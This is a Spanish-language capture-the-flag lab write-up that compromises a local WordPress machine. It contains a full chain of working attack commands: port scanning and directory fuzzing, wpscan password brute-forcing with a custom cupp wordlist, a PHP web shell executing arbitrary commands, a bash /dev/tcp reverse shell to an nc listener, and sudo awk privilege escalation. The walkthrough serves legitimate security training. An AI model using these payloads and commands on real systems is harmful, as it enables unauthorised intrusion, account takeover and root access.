Fecha: 03/09/2024

Comienzo con un nmap. Hay un ssh en el 22 y un Apache en el 80, ninguno de ellos vulnerable.

```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.3 -oN scan
```  

![](Imágenes/Pasted%20image%2020240903194243.png)

Inspecciono la página y en el apartado de profesores encuentro lo siguiente:
![](Imágenes/Pasted%20image%2020240903195625.png)


Hago fuzzing:
```
ffuf -c -w /usr/share/wordlists/directory-list-2.3-medium.txt -u http://172.17.0.3/FUZZ  -e .php,.html,.txt,.js -o fuzzing 
```

Encuentro varios directorios: 
![](Imágenes/Pasted%20image%2020240903194348.png)

Busco más en detalle en /wordpress:
```bash
ffuf -c -w /usr/share/wordlists/directory-list-2.3-medium.txt -u http://172.17.0.3/wordpress/FUZZ  -e .php,.html,.txt,.js -o fuzzing 
```

![](Imágenes/Pasted%20image%2020240903194541.png)

Utilizo wpscan para encontrar más detalles, e intentar enumerar usuarios: 
```
wpscan --url http://172.17.0.3/wordpress -e u
```

![](Imágenes/Pasted%20image%2020240903194841.png)

Encuentro que se puede listar el directorio uploads y que hay un usuario: luisillo. Buscaré la contraseña del mismo:
```bash
wpscan --url http://172.17.0.3/wordpress -U luisillo -P /usr/share/wordlists/rockyou.txt 
```

No encuentra nada, así que leo que hay una herramienta, cupp, que permite crear diccionarios a partir de datos que le demos. Voy a probar a usar los datos de "Luis" que encontré al principio. Relleno con los datos y pruebo de nuevo.

```bash
cupp -i
```

![](Imágenes/Pasted%20image%2020240903195846.png)
```
wpscan --url http://172.17.0.3/wordpress -U luisillo -P  luis.txt
```

![](Imágenes/Pasted%20image%2020240903195937.png)

Tuve que añadir a mi fichero hosts la siguiente linea para que me funcionara, pero inicio sesión con esas credenciales.
![](Imágenes/Pasted%20image%2020240903200156.png)

Como sé que /wp-content/uploads muestra los ficheros, subiré una command line para hacerme un reverse shell: 

```php
SHELL:  
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

![](Imágenes/Pasted%20image%2020240903200514.png)

![](Imágenes/Pasted%20image%2020240903200615.png)

```bash
# En la shell virtual:
bash -c 'bash -i >& /dev/tcp/172.17.0.1/9001 0>&1'
# En mi máquina atacante:
nc -lvnp 9001
```

Lo primero, trato la tty:
```shell
# Empezando desde la reverse shell:
script /dev/null -c bash

Control Z 

stty raw -echo; fg

reset xterm

export TERM=xterm
```

Una vez dentro, intento hacer `sudo -l` pero pide contraseña, así que exploro:
![](Imágenes/Pasted%20image%2020240903200810.png)

Como luisillo, puedo usar `awk` como su, lo cual aprovecho: https://gtfobins.github.io/gtfobins/awk/#sudo
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

![](Imágenes/Pasted%20image%2020240903200940.png)